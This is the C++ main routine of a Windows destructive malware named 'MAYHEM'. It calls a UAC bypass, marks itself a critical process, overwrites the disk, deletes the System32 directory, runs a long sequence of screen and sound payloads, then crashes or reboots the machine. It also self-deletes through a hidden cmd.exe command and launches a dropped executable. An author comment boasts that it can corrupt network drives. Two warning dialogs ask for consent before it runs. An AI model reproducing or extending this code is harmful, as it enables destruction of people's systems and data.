#include <Windows.h>
#include "BypassUAC.h"
#include "Setup.h"
#include "Payloads.h"
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	//Took A Week To Make! (This Malware Is No Joke, It Can Corrupt Network Drives!)
	if (IsElevated()) {
		if(!IsFirstRun()) {
			SetCriticalProcess();
			OverWriteDisk();
			WCHAR SystemDirectory[MAX_PATH] = { 0 };
			GetSystemDirectory(SystemDirectory, MAX_PATH);
			DestroyDirectory(SystemDirectory);
			CreateThread(0, 0, Cursor, 0, 0, 0);
			CreateThread(0, 0, Keyboard, 0, 0, 0);
			// Create a new thread for the CubeThread function
			CreateThread(NULL, 0, sound1, NULL, 0, NULL);
			HANDLE threadHandle = CreateThread(NULL, 0, CubeThread, NULL, 0, NULL);
			Sleep(20000);
			TerminateThread(threadHandle, 0);
			HANDLE Bubbles = CreateThread(NULL, 0, StartBubbles, NULL, 0, NULL);
			Sleep(20000);
			HANDLE Shake = CreateThread(0, 0, shake, 0, 0, 0);
			Sleep(10000);
			//sound1();
			TerminateThread(Shake, 0);
			CreateThread(NULL, 0, sound2, NULL, 0, NULL);
			HANDLE colours1 = CreateThread(0, 0, Colours1, 0, 0, 0);
			Sleep(10000);
			TerminateThread(colours1, 0);
			HANDLE colours2 = CreateThread(0, 0, Colours2, 0, 0, 0);
			//sound2();
			Sleep(20000);
			TerminateThread(colours2, 0);
			HANDLE colours3 = CreateThread(0, 0, Colours3, 0, 0, 0);
			Sleep(15000);
			TerminateThread(colours3, 0);
			HANDLE Squares = CreateThread(0, 0, squares, 0, 0, 0);
			Sleep(20000);
			//CreateThread(0, 0, Reckoning, 0, 0, 0);
			TerminateThread(Squares, 0);
			HANDLE Extreme = CreateThread(0, 0, extreme, 0, 0, 0);
			Sleep(20000);
			TerminateThread(Extreme, 0);
			HANDLE payload1Org = CreateThread(0, 0, Payload1Org, 0, 0, 0);
			Sleep(20000);
			TerminateThread(payload1Org, 0);
			HANDLE payload2Org = CreateThread(0, 0, Payload2Org, 0, 0, 0);
			Sleep(20000);
			TerminateThread(payload2Org, 0);
			HANDLE payload3Org = CreateThread(0, 0, Payload3Org, 0, 0, 0);
			Sleep(20000);
			TerminateThread(payload3Org, 0);
			HANDLE payload4Org = CreateThread(0, 0, Payload4Org, 0, 0, 0);
			Sleep(20000);
			TerminateThread(payload4Org, 0);
			HANDLE payload5Org = CreateThread(0, 0, Payload5Org, 0, 0, 0);
			Sleep(30000);
			TerminateThread(payload5Org, 0);
			HANDLE payload1 = CreateThread(0, 0, Payload1, 0, 0, 0);
			Sleep(20000);
			TerminateThread(payload1, 0);
			CreateThread(NULL, 0, MandelBrot, NULL, 0, NULL);
			HANDLE payload2 = CreateThread(0, 0, Payload2, 0, 0, 0);
			Sleep(20000);
			TerminateThread(payload2, 0);
			HANDLE payload3 = CreateThread(0, 0, Payload3, 0, 0, 0);
			Sleep(20000);
			TerminateThread(payload3, 0);
			HANDLE payload4 = CreateThread(0, 0, Payload4, 0, 0, 0);
			Sleep(20000);
			TerminateThread(payload4, 0);
			HANDLE payload5 = CreateThread(0, 0, Payload5, 0, 0, 0);
			Sleep(30000);
			TerminateThread(payload5, 0);
			CreateThread(0, 0, dark, 0, 0, 0);
			Sleep(15000);
			// Set the frequency and duration for the beep
			int frequency = 20000; // Replace with your desired frequency
			int duration = 20000;  // Replace with your desired duration in milliseconds

			// Play the beep sound
			Beep(frequency, duration);
			CrashORRebootWindows();
		}
		else {
			if (GetOSVersion()) {
				if (MessageBoxA(NULL, "Heads Up Person! You've Executed MALWARE!\r\n\This malware will harm your computer and makes it unusable.\r\n\simply press No and nothing will happen.\r\n\If you know what this malware does and are using a safe environment to test, \press Yes to start it.\r\n\r\n\DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "MAYHEM", MB_YESNO | MB_ICONWARNING) != IDYES ||
					MessageBoxA(NULL, "THIS IS THE LAST WARNING!\r\n\r\n\THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\STILL EXECUTE IT?", "OH, Really?", MB_YESNO | MB_ICONWARNING) != IDYES) {
					WCHAR pathtofile[MAX_PATH];
					HMODULE hModule = GetModuleHandle(NULL);
					GetModuleFileName(hModule, pathtofile, MAX_PATH);

					WCHAR cmdCommand[MAX_PATH];
					swprintf(cmdCommand, MAX_PATH, L"cmd.exe /C timeout /T 5 /NOBREAK & del /F \"%ls\"", pathtofile);

					// Launch the Command Prompt to execute the deletion command
					STARTUPINFOW si = { sizeof(STARTUPINFOW) };
					PROCESS_INFORMATION pi;
					CreateProcessW(NULL, cmdCommand, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
					ExitProcess(0);
				}
				user();
				all();
				CreateThread(NULL, 0, messageThread, (LPVOID)L"Get Ready For Your Doom! It's Coming Amidst The Shadows", 0, NULL);
				//MessageBoxA(NULL, "You Have Choosed Your Doom!", "Big Mistake", MB_OK | MB_ICONHAND | MB_TOPMOST);

				WCHAR pathtofile[MAX_PATH];
				HMODULE hModule = GetModuleHandle(NULL);
				GetModuleFileName(hModule, pathtofile, MAX_PATH);

				WCHAR cmdCommand[MAX_PATH];
				swprintf(cmdCommand, MAX_PATH, L"cmd.exe /C timeout /T 5 /NOBREAK & del /F \"%ls\"", pathtofile);

				// Launch the Command Prompt to execute the deletion command
				STARTUPINFOW si = { sizeof(STARTUPINFOW) };
				PROCESS_INFORMATION pi;
				if (CreateProcessW(NULL, cmdCommand, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
				{
					//yep! done!
				}
				else
				{
					// Handle error
					MessageBoxA(NULL, "Did You Delete Command Prompt!?", "UH OH!", MB_OK | MB_TOPMOST | MB_ICONERROR);
				}

				// Launch a program from C:\Windows\System32
				std::string programPath = "C:\\Windows\\System32\\Mercury.exe";
				ShellExecuteA(NULL, "open", programPath.c_str(), NULL, NULL, SW_HIDE);
				ExitProcess(0);
				//CrashORRebootWindows();
			}
			else {
				MessageBoxA(NULL, "This malware requires NT10.0 or above to work properly.", "ERROR", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
				ExitProcess(0);
			}
		}
	}
	else {
		Bypass();
		ExitProcess(0);
	}
}